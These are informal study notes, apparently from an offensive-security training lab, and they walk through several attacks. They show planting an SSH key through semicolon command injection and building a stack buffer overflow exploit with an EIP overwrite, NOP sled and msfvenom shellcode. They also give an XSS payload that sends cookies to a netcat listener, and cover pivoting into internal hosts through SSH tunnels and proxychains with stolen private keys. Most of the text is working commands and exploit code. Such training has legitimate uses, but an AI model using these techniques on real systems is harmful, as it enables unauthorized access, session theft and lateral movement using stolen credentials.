Studying and shit for keygen
; mkdir /var/www/.ssh
; ls lisa /var/www
(in your terminal on linux) ssh-keygen -t rsa (this makes your key)
(terminal) cat ~/.ssh/id_rsa.pub
; echo "THE ENTIRE KEY" >> /var/www/.ssh/authorized_keys (including the first part, and the student@linops)
; cat /var/www/.ssh/authorized_keys
ssh -S /tmp/DEV DEV -O forward -L2222:10.208.50.42:22 SOCKET2
ssh www-data@localhost -p2222
(this may give an error, run the ssh-keygen command it shows)

Instead of /var/www , it may be within a systems user. This could be seen as /home/Comrade/.ssh/authorized_keys
If you are going into someone's ssh known as comrade. This can be applied into the lesson by using the extranet.
################################################################################################################################
Linux python script and such
################################################################################################################################
### Linux
disass <function> #
Certain scripts can take user input ./func <<<$(echo "sjdlfnmlse")
Certain scripts can take parameters ./func $(echo "ojksdmiosdkosf")
gdb ./inventory.exe -> run <<<$(pyhton peebuff.py)

vim
gdb ./func -> run -> info functions -> pdisass main -> pdisass getuserinput
If a system does not have the peda plugin, open-source research the functions and find vulnerabilities.

####
vim lynnbuff.py
#!/usr/bin/env python

offset = "wijejnsoifoosmkefmsks"
print(offset)
#####
firefox on linux workstation -> wiremask.eu -> tools -> buffer overflow pattern generator
Instructor pointer is what we are targeting, EIP.
Copy the Hex given, use that HEX to find the offset (Register Value), use that offset to find the actual offset.

After finding the offset, recreate script as
####
#!/usr/bin/env python

offset = "wijejnsoifoosmkefmsks"
eip = "BBBB"
print(offset+eip)
#####
type shell in your peda -> env - gdb ./func -> show env -> unset env COLUMNS , unset env LINES -> show env
ctrl + c -> info proc map -> find /b (START HEX AFTER HEAP), (END IN HEX LINE), 0xff, 0xe4
(0xe4 and 0xff are jump locations)
####
#!/usr/bin/env python

offset = "wijejnsoifoosmkefmsks"
eip = "BBBB"
print(offset+eip)

'''
HEX1 -> Little Endian (from the back) 
HEX2
HEX3
HEX4
HEX5
'''
#####
type shell in your peda -> env - gdb ./func -> show env -> unset env COLUMNS , unset env LINES -> show env -> run -> ctrl+C DO NOT ENTER
info proc map -> find /b (START HEX AFTER HEAP), (END IN HEX LINE), 0xff, 0xe4
(0xe4 and 0xff are jump locations)
####
#!/usr/bin/env python

offset = "wijejnsoifoosmkefmsks"
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
print(offset+eip+nop)

'''
HEX1 -> Little Endian (from the back) 
HEX2
HEX3
HEX4
HEX5
'''
#####
make your eip your first little endian
0xf7de3b59 -> \x59\x3b\xde\xf7"
0xf7f588ab
0xf7f645fb
0xf7f6460f
0xf7f64aeb

quit to leave gbd or shell to go to shell

msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python

#####
type shell in your peda -> env - gdb ./func -> show env -> unset env COLUMNS , unset env LINES -> show env
ctrl + c -> info proc map -> find /b (START HEX AFTER HEAP), (END IN HEX LINE), 0xff, 0xe4
(0xe4 and 0xff are jump locations)
####
#!/usr/bin/env python

offset = "wijejnsoifoosmkefmsks"
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
buf = 
print(offset+eip+nop+buf)

'''
HEX1 -> Little Endian (from the back) 
HEX2
HEX3
HEX4
HEX5
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
'''
#####
If there is an error regenerate msfvenom buf lines and reattempt.
./func <<<$(python linbuff.py)

0xf7def000 0xffffe000
################################################################################################################################################################
Cross-Site Scripting:
################################################################################################################################################################
nc -l 127.0.0.1 42070
<script>document.location="http://127.0.0.1:42070/?username=" + document.cookie;</script>


When going from extranet into intra net, you are setting up your localhost like above, the: ssh -S /tmp/DEV DEV -O forward -LLOCALPORT:extranet 
is going to forward your socket that you made (the master socket named DEV) and send it to the extranet IP through the port that you made to forward it (the -L PORT)
Now when you run a localhost ssh ( ssh USERNAMEOFEXTRANET@localhost -p LOCALPORTYOUMADE) it will send you into the extranet.
Things i need to make sure work is doing this with a -D 9050 to send proxychains, but i believe it works. With this you are going to then steal the ssh key OF extranet (cat ~/.ssh/id_rsa.pub)
and save this key that you find into a file named StolenKey, from there you chmod 600 the folder, making sure to double check everything as to not overwrite your ssh key, 
and then you masquerade sshkey to get into the intranet ip you found (cat /etc/hosts , /etc/crontab) Jane will be the device name (intranet) and the IP will be intranet IP.
cat /etc/crontab wioll get you the cronjobs, youll see the backup.tar file in there.
 chmod 600 /home/student/stolenkey
 ssh -i /home/student/stolenkey jane@1.2.3.4
 
scp -P 20010 www-data@localhost:/tmp/backup.gz /home/student/backup.tar.gz
chmod 600 stolenkey1
tar -xvf /home/student/stolenkey1 -C /home/student/stolenkey1_gun

ssh -i /home/student/stolenkey1 Donovian-Intranet@192.168.150.253

ssh -MS /tmp/hype hype -O forward student@JUMP -L 41010:192.168.28.100:2222
ssh student@localhost -p 41010 -d 9050
ssh comrade@localhost -p 41010 -L 41011:192.168.150.253:3201 -D 9050
ssh -i /home/student/stolenkey/.ssh comrade@localhost -p 41011

To get into the T3, you first need to establish connection to your T1 from your box, this is the master socket. From there you use a localhost login on the local port you opened up to connect to the jump on its open ssh port. You then set up a local port connecting to your T1's socket that now connects to the T3 on its open ssh port, and you can send proxychains up through that as well. Now you masquerade using the T1's ssh key , which is the ssh -i, connecting to the port you set up that sends yourself into the T3.
